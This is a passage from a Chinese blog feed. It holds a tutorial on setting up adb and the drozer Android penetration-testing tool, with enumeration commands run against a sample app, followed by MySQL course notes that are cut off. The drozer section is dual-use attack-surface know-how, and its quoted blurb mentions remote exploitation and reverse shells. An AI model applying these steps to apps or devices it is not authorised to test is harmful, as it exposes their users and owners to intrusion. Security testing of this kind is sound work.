clean</span></span><br><span class="line">Endif</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建 Android 调试环境</title>
      <link href="/2020/04/29/Android-%E8%B0%83%E8%AF%95/"/>
      <url>/2020/04/29/Android-%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建-Android-调试环境"><a href="#搭建-Android-调试环境" class="headerlink" title="搭建 Android 调试环境"></a>搭建 Android 调试环境</h1><h2 id="安装adb"><a href="#安装adb" class="headerlink" title="安装adb"></a>安装adb</h2><p>首先保证 <code>java</code>, <code>javac</code>, <code>java -version</code> 都正常。</p><p>打开 <code>adt-bundle-windows-x86_64-20130219</code> 压缩包，里边已经装好了必需的包。打开 <code>sdk</code>文件夹，将 <code>tools</code> 和 <code>platform-tools</code> 路径配置到系统变量中。</p><p>此时打开 <code>cmd</code> 输入 <code>adb</code> 就能看到 <code>adb options</code> 了。</p><h2 id="安装-drozer"><a href="#安装-drozer" class="headerlink" title="安装 drozer"></a>安装 drozer</h2><p>打开下载的 <code>drozer-install</code> 压缩包，双击里边的  <code>setup.exe</code> 安装，里边还有一个 <code>agent.apk</code> ，这个装到要调试的手机里。</p><p>安装完将 <code>bin</code> 目录添加到环境变量中即可。</p><p><strong>在 <code>drozer</code> 目录中</strong>打开 cmd ，输入 <code>drozer</code> 即可看到 options 选项。</p><h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>cmd 输入 <code>adb devices</code> 查看连接的设备</p><p>注：如果找不到设备可以在电脑设备管理器处打开便携设备，查看当前连接的手机的硬件ID，类似于这样： <code>USB\VID_05C6&amp;PID_9039&amp;MI_00</code> ，然后进入 <code>C:\Users\xxx\.android</code> 目录 <code>adb_usb.ini</code> 文件(没有就新建这个文件),输入 <code>0x05C6</code> </p><p>重新 <code>adb devices</code> 即可看到设备。</p><p>常用命令：</p><p><code>adb shell</code> 即可进入命令交互界面</p><p><code>adb connect ip:port</code> 连接指定设备</p><p>使用 <code>drozer agent</code> 中的 <code>server embedded</code> 将测试设备与 PC 连接起来</p><p>先选择一个合适的端口以便 PC 能连接到 drozer agent 开放的 TCP socket</p><pre><code>adb forward tcp:31415 tcp:31415</code></pre><p>然后在要调试的手机中安装 agent.apk ，安装完后打开监听，默认端口是31415，将手机连到电脑上打开开发者模式调试状态(进入关于手机，版本号处连续点击3次即可进入开发者模式)。</p><p>然后就可以使用 drozer 连接了</p><p>进入 drozer 安装目录命令行输入： <code>drozer console connect</code> 即可进入命令行调试界面</p><p>注：如果这里报错需要检查如下项目</p><p>1、JDK是否安装</p><p>2、环境变量是否正确配置（命令行下执行：java、javac、java -version 命令是否返回正常数据）</p><p>如果以上项目均正常的话可做如下修复：</p><p>建立名为 .drozer_config的文件，文件中添加如下内容：</p><pre><code>[executables]java=D:\Java\jdk1.7.0_65\bin\java.exejavac=D:\Java\jdk1.7.0_65\bin\javac.exe</code></pre><p>即java和javac的路径，保存后存放到C:\Users\XXX\ 目录下，其中XXX为当前用户名目录下，之后重新连接成功</p><h3 id="drozer-使用"><a href="#drozer-使用" class="headerlink" title="drozer 使用"></a>drozer 使用</h3><p><strong>What is drozer?</strong></p><blockquote><p>drozer allows you to assume the role of an Android app and interact with other apps. It can do anything that an installed application can do, such as make use ofAndroid’s Inter-Process Communication (IPC) mechanism and interact with the underlying operating system. </p><p>drozer also helps to you to remotely exploit Android devices, by building malicious files or web pages that exploit known vulnerabilities. The payload that is used in these exploits is a rogue drozer agent that is essentially a remote administration tool. Depending on the permissions granted to the vulnerable app, drozer can install a full agent, inject a limited agent into the process using a novel technique or spawn a reverse shell.</p></blockquote><h4 id="找到目标"><a href="#找到目标" class="headerlink" title="找到目标"></a>找到目标</h4><p>第一步是查找我们要调试的包</p><pre><code>run app.package.list 查看所有安装在手机上应用程序的包名</code></pre><p>查找要测试的包名 xxx</p><pre><code>dz&gt; run app.package.list -f xxxcom.example.xxx (xxx)</code></pre><p>我们可以让 drozer 提供一些关于这个包的基本信息，使用 <code>app.package.info</code> </p><pre><code>dz&gt; run app.package.info -a com.mwr.example.sieve Package: com.mwr.example.sieveProcess Name: com.mwr.example.sieveVersion: 1.0Data Directory: /data/data/com.mwr.example.sieveAPK Path: /data/app/com.mwr.example.sieve-2.apkUID: 10056GID: [1028, 1015, 3003]Shared Libraries: nullShared User ID: nullUses Permissions:</code></pre><h4 id="探测攻击面"><a href="#探测攻击面" class="headerlink" title="探测攻击面"></a>探测攻击面</h4><p>我们可以让 drozer 报告包的攻击面</p><pre><code>dz&gt; run app.package.attacksurface com.mwr.example.sieveAttack Surface:    3 activities exported    0 broadcast receivers exported    2 content providers exported    2 services expo        is debuggable</code></pre><p>This shows that we have a number of potential vectors. The app ‘exports’ (makes accessible to other apps) a number of activities (screens used by the app), content providers (database objects) and services (background workers).</p><p>We also note that the service is debuggable, which means that we can attach a debugger to the process, using adb, and step through the code.</p><h4 id="Launching-Activities"><a href="#Launching-Activities" class="headerlink" title="Launching Activities"></a>Launching Activities</h4><p>我们可以使用更精确的命令来深入挖掘攻击面</p><pre><code>dz&gt; run app.activity.info -a com.mwr.example.sieve Package:com.mwr.example.sieve    com.mwr.example.sieve.FileSelectActivity    com.mwr.example.sieve.MainLoginActivit    com.mwr.example.sieve.PWLi</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><p><a href="https://www.cnblogs.com/JDragons/p/5596258.html" target="_blank" rel="noopener">https://www.cnblogs.com/JDragons/p/5596258.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> penetration test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration test </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库概论</title>
      <link href="/2020/04/29/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%AE%BA/"/>
      <url>/2020/04/29/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库概论"><a href="#数据库概论" class="headerlink" title="数据库概论"></a>数据库概论</h1><h2 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h2><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="创建新表并插入数据"><a href="#创建新表并插入数据" class="headerlink" title="创建新表并插入数据"></a>创建新表并插入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| Tables_in_studentinfo |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| course                |</span><br><span class="line">| sc                    |</span><br><span class="line">| studente              |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br></pre></td></tr></table></figure><p>将三个表全部删除然后新建新的表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop table course;</span><br><span class="line">mysql&gt; drop table sc;</span><br><span class="line">mysql&gt; drop table studente;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>要创建的表的属性：</p><p><img src="C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092800919.png" alt="image-20200317092800919"></p><p><img src="C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092828418.png" alt="image-20200317092828418"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table Student</span><br><span class="line">    -&gt; (Sno char(12) PRIMARY KEY, //主键</span><br><span class="line">    -&gt; Sname char(20) UNIQUE NOT NULL, //不为空且取值唯一</span><br><span class="line">    -&gt; Ssex char(8) DEFAULT 'male', //默认值 male</span><br><span class="line">    -&gt; Sage int(4),</span><br><span class="line">    -&gt; Sdept char(15)</span><br><span class="line">    -&gt; );</span><br><span class="line">mysql&gt; desc student;</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type     | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">| Sno   | char(12) | NO   | PRI | NULL    |       |</span><br><span class="line">| Sname | char(20) | NO   | UNI | NULL    |       |</span><br><span class="line">| Ssex  | char(8)  | YES  |     | male    |       |</span><br><span class="line">| Sage  | int(4)   | YES  |     | NULL    |       |</span><br><span class="line">| Sdept | char(15) | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table Course</span><br><span class="line">    -&gt; (Cno char(15) PRIMARY KEY,</span><br><span class="line">    -&gt; Cname char(20) NOT NULL,</span><br><span class="line">    -&gt; Cpno char(15),</span><br><span class="line">    -&gt; Credits SMALLINT //小整型</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.48 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc course;</span><br><span class="line">+<span class="comment">---------+-------------+------+-----+---------+-------+</span></span><br><span class="line">| Field   | Type        | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">---------+-------------+------+-----+---------+-------+</span></span><br><span class="line">| Cno     | char(15)    | NO   | PRI | NULL    |       |</span><br><span class="line">| Cname   | char(20)    | NO   |     | NULL    |       |</span><br><span class="line">| Cpno    | char(15)    | YES  |     | NULL    |       |</span><br><span class="line">| Credits | smallint(6) | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">---------+-------------+------+-----+---------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE SC(</span><br><span class="line">    -&gt; Sno char(12),</span><br><span class="line">    -&gt; Cno char(15),</span><br><span class="line">    -&gt; Grade SMALLINT,</span><br><span class="line">    -&gt; PRIMARY KEY(Sno,Cno) //以元组的形式创建多个主键</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc sc;</span><br><span class="line">+<span class="comment">-------+-------------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+-------------+------+-----+---------+-------+</span></span><br><span class="line">| Sno   | char(12)    | NO   | PRI |         |       |</span><br><span class="line">| Cno   | char(15)    | NO   | PRI |         |       |</span><br><span class="line">| Grade | smallint(6) | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">-------+-------------+------+-----+---------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>向各个表都插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO student</span><br><span class="line">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; ('201708034210','LiYong','male',20,'CS');</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from student;</span><br><span class="line">+<span class="comment">--------------+--------+------+------+-------+</span></span><br><span class="line">| Sno          | Sname  | Ssex | Sage | Sdept |</span><br><span class="line">+<span class="comment">--------------+--------+------+------+-------+</span></span><br><span class="line">| 201708034210 | LiYong | male |   20 | CS    |</span><br><span class="line">+<span class="comment">--------------+--------+------+------+-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>插入多行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO student</span><br><span class="line">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&apos;201215122&apos;,&apos;LiuChen&apos;,&apos;female&apos;,19,&apos;CS&apos;),</span><br><span class="line">    -&gt; (&apos;201215123&apos;,&apos;WangMin&apos;,&apos;female&apos;,18,&apos;CS&apos;),</span><br><span class="line">    -&gt; (&apos;201215125&apos;,&apos;ZhangLi&apos;,&apos;&apos;,19,&apos;IS&apos;);</span><br><span class="line">mysql&gt; select * from student;</span><br><span class="line">+--------------+---------+--------+------+-------+</span><br><span class="line">| Sno          | Sname   | Ssex   | Sage | Sdept |</span><br><span class="line">+--------------+---------+--------+------+-------+</span><br><span class="line">| 201708034210 | LiYong  | male   |   20 | CS    |</span><br><span class="line">| 201215122    | LiuChen | female |   19 | CS    |</span><br><span class="line">| 201215123    | WangMin | female |   18 | CS    |</span><br><span class="line">| 201215125    | ZhangLi |        |   19 | IS    |</span><br><span class="line">+--------------+---------+--------+------+-------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO COURSE</span><br><span class="line">    -&gt; (Cno,Cname,Cpno,Credits)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&apos;2&apos;,&apos;math&apos;,&apos;&apos;,2),</span><br><span class="line">    -&gt; (&apos;3&apos;,&apos;infosystem&apos;,&apos;1&apos;,4),</span><br><span class="line">    -&gt; (&apos;4&apos;,&apos;os&apos;,&apos;6&apos;,3),</span><br><span class="line">    -&gt; (&apos;5&apos;,&apos;datestructure&apos;,&apos;7&apos;,4),</span><br><span class="line">    -&gt; (&apos;6&apos;,&apos;dateprocessing&apos;,&apos;&apos;,2),</span><br><span class="line">    -&gt; (&apos;7&apos;,&apos;python&apos;,&apos;6&apos;,4);</span><br><span class="line">mysql&gt; select * from course;</span><br><span class="line">+-----+----------------+------+---------+</span><br><span class="line">| Cno | Cname          | Cpno | Credits |</span><br><span class="line">+-----+----------------+------+---------+</span><br><span class="line">| 1   | database       | 5    |       4 |</span><br><span class="line">| 2   | math           |      |       2 |</span><br><span class="line">| 3   | infosystem     | 1    |       4 |</span><br><span class="line">| 4   | os             | 6    |       3 |</span><br><span class="line">| 5   | datestructure  | 7    |       4 |</span><br><span class="line">| 6   | dateprocessing |      |       2 |</span><br><span class="line">| 7   | python         | 6    |       4 |</span><br><span class="line">+-----+----------------+------+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO sc</span><br><span class="line">    -&gt; (Sno,Cno,Grade)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&apos;201215121&apos;,&apos;1&apos;,92),</span><br><span class="line">    -&gt; (&apos;201215121&apos;,&apos;3&apos;,85),</span><br><span class="line">    -&gt; (&apos;201215121&apos;,&apos;2&apos;,88),</span><br><span class="line">    -&gt; (&apos;201215122&apos;,&apos;2&apos;,90),</span><br><span class="line">    -&gt; (&apos;201215122&apos;,&apos;3&apos;,80);</span><br><span class="line">Query OK, 5 rows affected (0.00 sec)</span><br><span class="line">Records: 5  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM SC;</span><br><span class="line">+-----------+-----+-------+</span><br><span class="line">| Sno       | Cno | Grade |</span><br><span class="line">+-----------+-----+-------+</span><br><span class="line">| 201215121 | 1   |    92 |</span><br><span class="line">| 201215121 | 3   |    85 |</span><br><span class="line">| 201215121 | 2   |    88 |</span><br><span class="line">| 201215122 | 2   |    90 |</span><br><span class="line">| 201215122 | 3   |    80 |</span><br><span class="line">+-----------+-----+-------+</span><br></pre></td></tr></table></figure><p>第四条插入时想使用默认值，于是插入了空，但是却没设置为默认值，更新一下这条数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> field1=<span class="keyword">new</span>-value1, field2=<span class="keyword">new</span>-value2</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">UPDATE</span> student <span class="keyword">SET</span> Ssex=<span class="string">'male'</span> <span class="keyword">WHERE</span> Sno=<span class="string">'201215125'</span>;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from student;</span><br><span class="line">+<span class="comment">--------------+---------+--------+------+-------+</span></span><br><span class="line">| Sno          | Sname   | Ssex   | Sage | Sdept |</span><br><span class="line">+<span class="comment">--------------+---------+--------+------+-------+</span></span><br><span class="line">| 201708034210 | LiYong  | male   |   20 | CS    |</span><br><span class="line">| 201215122    | LiuChen | female |   19 | CS    |</span><br><span class="line">| 201215123    | WangMin | female |   18 | CS    |</span><br><span class="line">| 201215125    | ZhangLi | male   |   19 | IS    |</span><br><span class="line">+<span class="comment">--------------+---------+--------+------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>正确使用默认值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO student</span><br><span class="line">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&apos;201215124&apos;,&apos;JingYu&apos;,default,27,&apos;MATH&apos;);</span><br><span class="line">    </span><br><span class="line">mysql&gt; select * from student where Sno=&apos;201215124&apos;;</span><br><span class="line">+-----------+--------+------+------+-------+</span><br><span class="line">| Sno       | Sname  | Ssex | Sage | Sdept |</span><br><span class="line">+-----------+--------+------+------+-------+</span><br><span class="line">| 201215124 | JingYu | male |   27 | MATH  |</span><br><span class="line">+-----------+--------+------+------+-------+</span><br></pre></td></tr></table></figure><p>删除数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from student where Sno=&apos;s09&apos;;</span><br></pre></td></tr></table></figure><h3 id="索引的建立与删除"><a href="#索引的建立与删除" class="headerlink" title="索引的建立与删除"></a>索引的建立与删除</h3><p>建立索引是加快查询速度的有效手段。常见索引包括顺序文件上的索引、B+树索引、散列(hash)索引、位图索引等。索引管理一般由管理员完成，用户不必也不能显式地选择索引。索引属于内模式的范畴。</p><h4 id="建立索引"><a href="#建立索引" class="headerlink" title="建立索引"></a>建立索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE [UNIQUE] [CLUSTER] INDEX &lt;索引名&gt; ON &lt;表名&gt;(&lt;列名&gt; [&lt;次序&gt;]...)</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE UNIQUE INDEX Stusno ON student(Sno);  //ASC 升序（默认）</span><br><span class="line">mysql&gt; CREATE UNIQUE INDEX Coucno ON course(Cno);</span><br><span class="line">mysql&gt; CREATE UNIQUE INDEX SCno ON SC(Sno ASC,Cno DESC); //DESC 降序</span><br></pre></td></tr></table></figure><h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP INDEX index_name;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE SC DROP INDEX SCno;</span><br></pre></td></tr></table></figure><h4 id="修改索引"><a href="#修改索引" class="headerlink" title="修改索引"></a>修改索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MYSQL 没有提供直接修改索引的命令，一般情况下我们需要先删除原索引，再建立新索引</span><br><span class="line"></span><br><span class="line">ALTER TABLE user</span><br><span class="line">DROP INDEX idx_user_username;</span><br><span class="line">--再以修改后的内容创建同名索引</span><br><span class="line">CREATE INDEX idx_user_username ON user (username(8));</span><br></pre></td></tr></table></figure><h4 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上FROM db_name</span><br><span class="line">SHOW INDEX FROM table_name [FROM db_name]</span><br><span class="line">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上db_name.前缀</span><br><span class="line">SHOW INDEX FROM [db_name.]table_name</span><br></pre></td></tr></table></figure><h3 id="修改基本表"><a href="#修改基本表" class="headerlink" title="修改基本表"></a>修改基本表</h3><blockquote><p><strong>2.1</strong> 向基本表Student中增加“入学时间”属性列，其属性名为RegisterDate，数据类型为DATETIME型</p><p><strong>2.2</strong> 将Sage(年龄)的数据类型改为SMALLINT型.</p><p><strong>2.3</strong> 删除属性列RegisterDate.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE student ADD RegisterDate DATETIME; //新增列</span><br><span class="line">mysql&gt; ALTER TABLE student modify column Sage smallint; //更新数据类型，注意是 modify</span><br><span class="line">mysql&gt; ALTER TABLE student change column RegisterDate RDate time; //同时修改列名和列的数据类型</span><br><span class="line">mysql&gt; desc student;</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Sno   | char(12)    | NO   | PRI | NULL    |       |</span><br><span class="line">| Sname | char(20)    | NO   | UNI | NULL    |       |</span><br><span class="line">| Ssex  | char(8)     | YES  |     | male    |       |</span><br><span class="line">| Sage  | smallint(6) | YES  |     | NULL    |       |</span><br><span class="line">| Sdept | char(15)    | YES  |     | NULL    |       |</span><br><span class="line">| RDate | time        | YES  |     | NULL    |       |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">6 rows in set (0.01 sec)</span><br><span class="line">mysql&gt; ALTER TABLE student drop column RDate; //删除新增的列</span><br></pre></td></tr></table></figure><h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><h4 id="无条件查询"><a href="#无条件查询" class="headerlink" title="无条件查询"></a>无条件查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Sname,Sno,Sdept from student; //查询基本信息</span><br><span class="line">mysql&gt; select Sname,2020-Sage from student; //查询计算之后的信息</span><br><span class="line">mysql&gt; select Sname,&apos;Year of Brith:&apos;,2020-Sage,LOWER(Sdept) from student; //查询全体学生的姓名、出生年份和学号，要求用小写字母表示学号中的字母</span><br><span class="line">+---------+----------------+-----------+--------------+</span><br><span class="line">| Sname   | Year of Brith: | 2020-Sage | LOWER(Sdept) |</span><br><span class="line">+---------+----------------+-----------+--------------+</span><br><span class="line">| LiYong  | Year of Brith: |      2000 | cs           |</span><br><span class="line">| LiuChen | Year of Brith: |      2001 | cs           |</span><br><span class="line">| WangMin | Year of Brith: |      2002 | cs           |</span><br><span class="line">| ZhangLi | Year of Brith: |      2001 | is           |</span><br><span class="line">| JingYu  | Year of Brith: |      1993 | math         |</span><br><span class="line">+---------+----------------+-----------+--------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,&apos;Year of Brith:&apos;BIRTH,2020-Sage BIRTHDAY,LOWER(Sdept) DEPARTMENT from student; //给查询结果使用别名</span><br><span class="line">+---------+----------------+----------+------------+</span><br><span class="line">| Sname   | BIRTH          | BIRTHDAY | DEPARTMENT |</span><br><span class="line">+---------+----------------+----------+------------+</span><br><span class="line">| LiYong  | Year of Brith: |     2000 | cs         |</span><br><span class="line">| LiuChen | Year of Brith: |     2001 | cs         |</span><br><span class="line">| WangMin | Year of Brith: |     2002 | cs         |</span><br><span class="line">| ZhangLi | Year of Brith: |     2001 | is         |</span><br><span class="line">| JingYu  | Year of Brith: |     1993 | math       |</span><br><span 